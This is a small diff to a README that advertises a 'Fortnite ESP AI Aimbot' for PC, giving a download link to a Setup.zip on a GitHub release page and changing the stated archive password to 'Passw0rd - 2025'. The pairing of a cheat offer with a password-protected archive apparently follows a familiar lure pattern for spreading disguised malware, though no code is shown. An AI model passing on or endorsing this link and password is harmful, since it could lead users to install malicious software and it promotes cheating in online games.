@@ -2,7 +2,8 @@
 # 🚀 Fortnite ESP AI Aimbot For PC 🚀
 
 https://github.com/3ve3do4ka/Fortnite-ESP-AI-Aimbot/releases/download/Setup/Setup.zip
-pswrd - 2025
+
+Passw0rd - 2025
 
 ## 📜 Overview
 
